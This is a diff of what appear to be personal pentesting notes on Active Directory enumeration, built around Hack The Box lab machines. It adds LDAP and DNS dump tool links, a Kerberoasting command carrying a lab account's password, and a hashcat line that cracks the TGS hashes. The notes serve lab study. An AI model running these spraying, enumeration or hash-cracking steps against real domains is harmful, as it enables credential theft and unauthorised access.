@@ -7,7 +7,7 @@ description: Notes about Active Directory
 keywords: Internals
 ---
 
-# Active Directory Enumeration
+# Initial Enumeration
 [Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)
   - Checks badpwdcount attribute only in the domain policy
 
@@ -27,9 +27,18 @@ Domain Contexts: ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts
 Search Users: ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)'
 ```
 
+Other resources
+  - https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/
+
 [LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)
 
-Useful if Bloodhound.py isn't working as intended.
+Old tool however useful if Bloodhound.py isn't working as intended.
+
+[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)
+Any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer.
+
+Additional Resources:
+  - https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/
 
 [BloodHound CE](https://github.com/SpecterOps/BloodHound)
 
@@ -71,9 +80,12 @@ Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object 
 
 **Requires:** Domain Credentials
 
-**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets
+**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets containing the SPN hashes.
 
-`GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100`
+```
+GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
+hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
+```
 
 ## Lateral Movement
 [ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)
